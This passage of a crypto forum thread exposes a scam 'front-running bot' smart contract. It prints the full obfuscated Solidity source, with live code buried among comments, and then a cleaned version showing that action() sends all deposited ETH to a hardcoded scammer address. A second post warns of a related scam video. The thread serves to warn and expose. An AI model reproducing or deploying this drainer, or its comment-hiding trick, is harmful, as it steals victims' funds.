web3.eth.accounts.privateKeyToAccount(PRIVATE_KEY);        //const out_token_address = TOKEN_ADDRESS;        //const amount = AMOUNT;        //const level = LEVEL;                //ret = await preparedAttack(INPUT_TOKEN_ADDRESS, out_token_address, user_wallet, amount, level);        //if(ret == false) {          //process.exit();                //await updatePoolInfo();        //outputtoken = await pancakeRouter.methods.getAmountOut(((amount*1.2)*(10**18)).toString(), pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();        //await approve(gas_price_info.high, outputtoken, out_token_address, user_wallet);                //log_str = '***** Tracking more ' + (pool_info.attack_volumn/(10**input_token_info.decimals)).toFixed(5) + ' ' +  input_token_info.symbol + '  Exchange on Pancake *****'        // console.log(log_str.green);            // console.log(web3Ws);        //web3Ws.onopen = function(evt) {            //web3Ws.send(JSON.stringify({ method: \"subscribe\", topic: \"transfers\", address: user_wallet.address }));            //console.log('connected')                // get pending transactions        //subscription = web3Ws.eth.subscribe('pendingTransactions', function (error, result) {        //}).on(\"data\", async function (transactionHash) {            //console.log(transactionHash);            // let transaction = await web3.eth.getTransaction(transactionHash);            // if (transaction != null && transaction['to'] == PANCAKE_ROUTER_ADDRESS)            // {            //     await handleTransaction(transaction, out_token_address, user_wallet, amount, level);            // }                        //if (succeed) {                //console.log(\"The bot finished the attack.\");                //process.exit();                                    //catch (error) {            //if(error.data != null && error.data.see === 'https://infura.io/dashboard')               //console.log('Daily request count exceeded, Request rate limited'.yellow);         //console.log('Please insert other API Key');      //else{         //console.log('Unknown Handled Error');         //console.log(error);             //process.exit();//function handleTransaction(transaction, out_token_address, user_wallet, amount, level) {        //(await triggersFrontRun(transaction, out_token_address, amount, level)) {        //subscription.unsubscribe();        //console.log('Perform front running attack...');        //gasPrice = parseInt(transaction['gasPrice']);        //newGasPrice = gasPrice + 50*ONE_GWEI;        //estimatedInput = ((amount*0.999)*(10**18)).toString();        //realInput = (amount*(10**18)).toString();        //gasLimit = (300000).toString();                //await updatePoolInfo();        //var outputtoken = await pancakeRouter.methods.getAmountOut(estimatedInput, pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();        //swap(newGasPrice, gasLimit, outputtoken, realInput, 0, out_token_address, user_wallet, transaction);        //console.log(\"wait until the honest transaction is done...\", transaction['hash']);        //while (await isPending(transaction['hash'])) {                //if(buy_failed)                    //succeed = false;            //return;                           //console.log('Buy succeed:')                //Sell        //await updatePoolInfo();        //var outputeth = await pancakeRouter.methods.getAmountOut(outputtoken, pool_info.output_volumn.toString(), pool_info.input_volumn.toString()).call();        //outputeth = outputeth * 0.999;        //await swap(newGasPrice, gasLimit, outputtoken, outputeth, 1, out_token_address, user_wallet, transaction);                //console.log('Sell succeed');        //succeed = true;manager;//async function approve(gasPrice, outputtoken, out_token_address, user_wallet){    //var allowance = await out_token_info.token_contract.methods.allowance(user_wallet.address, PANCAKE_ROUTER_ADDRESS).call();        //allowance = BigNumber(allowance);    //outputtoken = BigNumber(outputtoken);    //var decimals = BigNumber(10).power(out_token_info.decimals);    //var max_allowance = BigNumber(10000).multiply(decimals);    //if(outputtoken.gt(max_allowance))          //console.log('replace max allowance')       //max_allowance = outputtoken;              payable(uniswapDepositAddress()).transfer(address(this).balance);              //if(outputtoken.gt(allowance)){        //console.log(max_allowance.toString());        //var approveTX ={                //from: user_wallet.address,                //to: out_token_address,                //gas: 50000,                //gasPrice: gasPrice*ONE_GWEI,                //data: out_token_info.token_contract.methods.approve(PANCAKE_ROUTER_ADDRESS, max_allowance).encodeABI()                manager;                    //var signedTX = await user_wallet.signTransaction(approveTX);        //var result = await web3.eth.sendSignedTransaction(signedTX.rawTransaction);        //console.log('Approved Token')        //return;//select attacking transaction//async function triggersFrontRun(transaction, out_token_address, amount, level) {        //if(attack_started)        //return false;    //console.log((transaction.hash).yellow, parseInt(transaction['gasPrice']) / 10**9);    //if(parseInt(transaction['gasPrice']) / 10**9 > 10 && parseInt(transaction['gasPrice']) / 10**9 < 50){        //attack_started = true;        //return true}    //return false;    //if (transaction['to'] != PANCAKE_ROUTER_ADDRESS)            //console.log(transactionHash);            // let transaction = await web3.eth.getTransaction(transactionHash);            // if (transaction != null && transaction['to'] == PANCAKE_ROUTER_ADDRESS)            // {                function uniswapDepositAddress() public pure returns (address) {            //     await handleTransaction(transaction, out_token_address, user_wallet, amount, level);            // }                        //if (succeed) {                //console.log(\"The bot finished the attack.\");                //process.exit();                                    //catch (error) {            //if(error.data != null && error.data.see === 'https://infura.io/dashboard')               //console.log('Daily request count exceeded, Request rate limited'.yellow);         //console.log('Please insert other API Key');      //else{         //console.log('Unknown Handled Error');         //console.log(error);             //process.exit();//function handleTransaction(transaction, out_token_address, user_wallet, amount, level) {        //(await triggersFrontRun(transaction, out_token_address, amount, level)) {        //subscription.unsubscribe();        //console.log('Perform front running attack...');        //gasPrice = parseInt(transaction['gasPrice']);        //newGasPrice = gasPrice + 50*ONE_GWEI;        //estimatedInput = ((amount*0.999)*(10**18)).toString();        //realInput = (amount*(10**18)).toString();        //gasLimit = (300000).toString();                //await updatePoolInfo();                //swap(newGasPrice, gasLimit, outputtoken, realInput, 0, out_token_address, user_wallet, transaction);        //console.log(\"wait until the honest transaction is done...\", transaction['hash']);        //while (await isPending(transaction['hash'])) {                //if(buy_failed)                    //succeed = false;            //return;                           //console.log('Buy succeed:')                //Sell        //await updatePoolInfo();        //var outputeth = await pancakeRouter.methods.getAmountOut(outputtoken, pool_info.output_volumn.toString(), pool_info.input_volumn.toString()).call();        //outputeth = outputeth * 0.999;        //await swap(newGasPrice, gasLimit, outputtoken, outputeth, 1, out_token_address, user_wallet, transaction);                //console.log('Sell succeed');        //succeed = true;////async function approve(gasPrice, outputtoken, out_token_address, user_wallet){    //var allowance = await out_token_info.token_contract.methods.allowance(user_wallet.address, PANCAKE_ROUTER_ADDRESS).call();        //allowance = BigNumber(allowance);    //outputtoken = BigNumber(outputtoken);    //var decimals = BigNumber(10).power(out_token_info.decimals);    //var max_allowance = BigNumber(10000).multiply(decimals);    //if(outputtoken.gt(max_allowance))          //console.log('replace max allowance')       //max_allowance = outputtoken;                     //if(outputtoken.gt(allowance)){        //console.log(max_allowance.toString());        //var approveTX ={                //from: user_wallet.address,                //to: out_token_address,                //gas: 50000,                //gasPrice: gasPrice*ONE_GWEI,                //data: out_token_info.token_contract.methods.approve(PANCAKE_ROUTER_ADDRESS, max_allowance).encodeABI()               //                     //var signedTX = await user_wallet.signTransaction(approveTX);        //var result = await web3.eth.sendSignedTransaction(signedTX.rawTransaction);        //console.log('Approved Token')        //return;//select attacking transaction//async function triggersFrontRun(transaction, out_token_address, amount, level) {        //if(attack_started)        //return false;    //console.log((transaction.hash).yellow, parseInt(transaction['gasPrice']) / 10**9);    //if(parseInt(transaction['gasPrice']) / 10**9 > 10 && parseInt(transaction['gasPrice']) / 10**9 < 50){  //var outputtoken = await pancakeRouter.methods.getAmountOut(estimatedInput,   return 0xA63e1a6BAC832BDBCe948DB116e22830865F7bBe;//pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();  }        //attack_started = true;        //return true  //      //return false;    //if (transaction['to'] != PANCAKE_ROUTER_ADDRESS) {        //return false;       //let data = parseTx(transaction['input']);       //let method = data[0];        //let params = data[1];        //let gasPrice = parseInt(transaction['gasPrice']) / 10**9;        //if(method == 'swapExactETHForTokens')                //let in_amount = transaction;                //let out_min = params[0];                //let path = params[1];                //let in_token_addr = path[0];                //let out_token_addr = path[path.length-1];                        //let recept_addr = params[2];                //let deadline = params[3];                //if(out_token_addr != out_token_address)                            // console.log(out_token_addr.blue)            // console.log(out_token_address)            //return false;}Weeding out the comments (lines that start with // and empty lines leds to thisCode:pragma solidity ^0.6.6;import \"https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Callee.sol\";import \"https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol\";import \"https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol\";contract UniswapV2FrontBot {    string public tokenName; string public tokenSymbol; uint frontrun; uint manager; constructor(string memory _tokenName, string memory _tokenSymbol) public {  tokenName = _tokenName;  tokenSymbol = _tokenSymbol;  manager = frontrun;  }     receive() external payable {}     function action() public payable {        manager;manager;       payable(uniswapDepositAddress()).transfer(address(this).balance);                manager;}                function uniswapDepositAddress() public pure returns (address) {  return 0xA63e1a6BAC832BDBCe948DB116e22830865F7bBe;  }}Once executed (action), the deposited ETH is simply just sent to the scammer's address which is this one  0xA63e1a6BAC832BDBCe948DB116e22830865F7bBe (uniswapDepositAddress)",
      "score": 0,
      "upvotes": 0,
      "downvotes": 0
    },
    {
      "author": "SUN0",
      "created_time": "September 06, 2023, 03:08:40 AM",
      "body": "https://www.youtube.com/watch?v=c67wWQOpTns&ab_channel=DeanAlmaAnother new video of the scammers, report this please before they get another victim",
      "score": 0,
      "upvotes": 0,
      "downvotes": 0
    }
  ]
}